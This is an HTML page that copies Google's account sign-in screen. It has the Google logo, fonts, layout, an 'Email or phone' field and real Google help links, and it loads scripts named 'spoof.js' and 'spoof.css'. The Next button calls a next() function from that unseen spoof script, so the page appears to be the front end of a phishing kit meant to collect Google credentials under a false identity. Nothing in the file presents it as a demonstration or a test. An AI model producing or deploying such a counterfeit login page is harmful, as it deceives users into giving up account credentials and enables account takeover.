<!DOCTYPE html>
<html>
    <head>
		<title>Google Login</title>
		<script src="spoof.js"></script>
		<link rel="stylesheet" type="text/css" href="spoof.css" />
		<link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
        <link rel="stylesheet" href="https://code.getmdl.io/1.3.0/material.light_blue-blue.min.css" />
        <script defer src="material.min.js"></script>
        <link rel="shortcut icon" href="favicon.ico">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        
        <!-- YOUR CSS INJECTED HERE -->
        <style>
            @font-face {
              font-family: 'Google Sans';
              src: URL('Google.ttf') format('truetype');
            }

            input:-webkit-autofill {
                -webkit-box-shadow: 0 0 0 1000px white inset !important;
            }

            html {
                -webkit-background-size: cover;
                -moz-background-size: cover;
                -o-background-size: cover;
                background-size: cover;
            }

            .box {
                position: absolute;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                height: 500px;
                width: 450px;
                margin: auto;
                vertical-align: middle;
                background-color: white;
                opacity: 1;
                border: 1px lightgrey solid;
                border-radius: 8px;
            }

            .grid-container {
                width: 100%;
                height: 100%;
                display: grid;
                grid-template-columns: repeat(20, 5%);
                grid-template-rows: repeat(25, 4%);
            }

            .header1 {
                font-family: 'Google Sans', arial, sans-serif;
                font-size: 24px;
                font-weight: 400;
                direction: ltr;
                grid-column-start: 2;
                grid-column-end: 10;
                grid-row-start: 5;
                grid-row-end: 7;
                text-align: left;
                padding-top: 8px;
                padding-left: 16px;
            }

            .header2 {
                font-family: 'roboto', arial, sans-serif;
                font-size: 16px;
                font-weight: 400;
                grid-column-start: 2;
                grid-column-end: 12;
                grid-row-start: 7;
                grid-row-end: 8;
                text-align: left;
                padding-top: 2px;
                padding-left: 17px;
                letter-spacing: .2px;
            }

            .logo {
                grid-column-start: 2;
                grid-column-end: 7;
                grid-row-start: 3;
                grid-row-end: 5;
                padding-left: 16px;
                padding-right: 22px;
                padding-top: 7px;
                padding-bottom: 0px;
                pointer-events: none;
            }

            img {
                max-width: 100%;
                max-height: 100%;
            }

            .email {
                grid-column-start: 2;
                grid-column-end: 19;
                grid-row-start: 10;
                grid-row-end: 14;
                padding-left: 15px;
                padding-top: 4px;
            }

            .forgot {
                font-family: 'roboto', arial, sans-serif;
                font-size: 14px;
                font-weight: 400;
                grid-column-start: 2;
                grid-column-end: 9;
                grid-row-start: 14;
                grid-row-end: 15;
                text-align: left;
                padding-left: 18px;
                padding-top: 8px;
                transform: scaleY(1.1);
            }

            a {
                text-decoration: none;
                color: #4285f4;
            }

            .guest-mode {
                font-family: 'roboto', arial, sans-serif;
                font-size: 12px;
                font-weight: 400;
                grid-column-start: 2;
                grid-column-end: 17;
                grid-row-start: 17;
                grid-row-end: 19;
                text-align: left;
                color: #757575;
                padding-top: 11px;
                padding-left: 14px;
                direction: ltr;
                white-space: normal;
                transform: scaleX(.985);
            }

            .learn-more {
                font-family: 'roboto', arial, sans-serif;
                font-size: 12px;
                font-weight: 400;
                grid-column-start: 16;
                grid-column-end: 19;
                grid-row-start: 17;
                grid-row-end: 19;
                text-align: left;
                padding-left: 3px;
                padding-top: 11px;
            }

            .create-account {
                font-family: 'roboto', arial, sans-serif;
                font-size: 14px;
                font-weight: 400;
                grid-column-start: 2;
                grid-column-end: 9;
                grid-row-start:20;
                grid-row-end: 21;
                text-align: left;
                padding-left: 18px;
                padding-top: 12px;
            }

            .next {
                grid-column-start: 15;
                grid-column-end: 19;
                grid-row-start:20;
                grid-row-end: 22;
                cursor: pointer;
            }
        </style>
	</head>
    <body>
    <div class="box" id="box">
    <div class="grid-container" id="grid-container">
        <div class="header1" id="header1">
            Sign in
        </div>
        <div class="header2" id="header2">
            with your Google Account
        </div>
        <div class="logo" id="logo" title="Google">
            <img src="Google.png">
        </div>
        <div class="email" id="email">
            <!-- Textfield with Floating Label -->
            <form action="#">
                <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label" id="input">
                    <input class="mdl-textfield__input" type="text" id="input1" autofocus>
                    <label class="mdl-textfield__label" for="sample3" id="input2">Email or phone</label>
                </div>
            </form>
        </div>
        <div class="forgot" id="forgot">
            <a class="forgot-link" href="https://accounts.google.com/signin/v2/usernamerecovery?passive=1209600&continue=https%3A%2F%2Faccounts.google.com%2FManageAccount&followup=https%3A%2F%2Faccounts.google.com%2FManageAccount&flowName=GlifWebSignIn&flowEntry=ServiceLogin">
                <span id="forgot-text">
                    Forgot email?
                </span>
            </a>
        </div>
        <div class="guest-mode" id="guest-mode">
            Not your computer? Use Guest mode to sign in privately.
        </div>
        <div class= "learn-more" id="learn-more">
            <a class="learn" href="https://support.google.com/chrome/answer/6130773?hl=en">
                Learn more
            </a>
        </div>
        <div class="create-account" id="create-account">
            <a class="create" href="https://accounts.google.com/signup/v2/webcreateaccount?flowName=GlifWebSignIn&flowEntry=SignUp">
                Create account
            </a>
        </div>
        <div class="next" id="next">
            <button style="width: 85px;" id="button" onclick="next()" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-button--accent">
                Next
            </button>
        </div>
    </div>
    </div>
    </body>
</html>
